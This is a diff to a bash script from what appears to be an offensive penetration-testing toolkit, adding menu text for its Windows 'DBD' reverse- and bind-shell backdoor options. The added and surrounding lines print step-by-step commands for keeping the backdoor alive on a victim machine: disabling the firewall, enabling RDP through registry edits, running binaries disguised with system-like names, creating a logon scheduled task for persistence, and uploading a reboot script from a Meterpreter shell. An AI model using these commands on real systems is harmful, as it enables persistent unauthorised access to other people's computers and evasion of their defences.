@@ -383,6 +383,7 @@ do
 		echo "While this backdoor is self healing; it will not auto start at reboot."
 		echo "To get your shell back after a reboot, open the firewall, & enable RDP, enter the following on the target (commands in RED, one command per line):"
 		echo ""
+		echo "INSTRUCTIONS FROM A WINDOWS TERMINAL SHELL:"
 		echo -e "\E[1;34m\e[97m \e[31mnetsh firewall set opmode disable\e[97m - This disables the firewall totally (optional depending on target/goals)\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
@@ -399,6 +400,13 @@ do
 		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
 		echo ""
 		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
+        echo ""
+        echo "INSTRUCTIONS FROM A METERPRETER SHELL:"
+        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mupload '/root/ATAT/DBD_reboot.bat' %WINDIR%\\\\\System32\\\\\DBD_reboot.bat\e[97m\E[1;34m"
+        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mshell\e[97m\E[1;34m"
+        echo "Now from the Windows Terminal:"
+        echo -e "\E[1;34m\e[97m \e[31mcd\windows\system32\e[97m\E[1;34m"
+        echo -e "\E[1;34m\e[97m \e[31mDBD_reboot.bat\e[97m\E[1;34m"
             ;;
        "Windows DBD Bind Shell")
         read -p "What port would you like the victim be listening on? (RPORT)" attackerport
@@ -432,6 +440,7 @@ do
 		echo "While this backdoor is self healing; it will not auto start at reboot."
 		echo "To get your shell back after a reboot, open the firewall, & enable RDP, enter the following on the target (commands in RED, one command per line):"
 		echo ""
+		echo "INSTRUCTIONS FROM A WINDOWS TERMINAL SHELL:"
 		echo -e "\E[1;34m\e[97m \e[31mnetsh firewall set opmode disable\e[97m - This disables the firewall totally (optional depending on target/goals)\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\e[97m- This enables RDP, step 1 (optional depending on target/goals)\E[1;34m"
 		echo -e "\E[1;34m\e[97m \e[31mreg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fAllowToGetHelp /t REG_WORD /d 1 /f\e[97m - This enables RDP, step 2 (optional depending on target/goals)\E[1;34m"
@@ -448,6 +457,13 @@ do
 		echo -e "\E[1;34m\e[97m \e[31m%WINDIR%\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe\e[97m\E[1;34m"
 		echo ""
 		echo -e "\E[1;34m\e[97m \e[31mschtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"\e[97m\E[1;34m"
+        echo ""
+        echo "INSTRUCTIONS FROM A METERPRETER SHELL:"
+        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mupload '/root/ATAT/DBD_reboot.bat' %WINDIR%\\\\\System32\\\\\DBD_reboot.bat\e[97m\E[1;34m"
+        echo -e "\E[1;34m\e[97mmeterpreter > \e[31mshell\e[97m\E[1;34m"
+        echo "Now from the Windows Terminal:"
+        echo -e "\E[1;34m\e[97m \e[31mcd\windows\system32\e[97m\E[1;34m"
+        echo -e "\E[1;34m\e[97m \e[31mDBD_reboot.bat\e[97m\E[1;34m"
             ;;
         "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell")	
 		clear
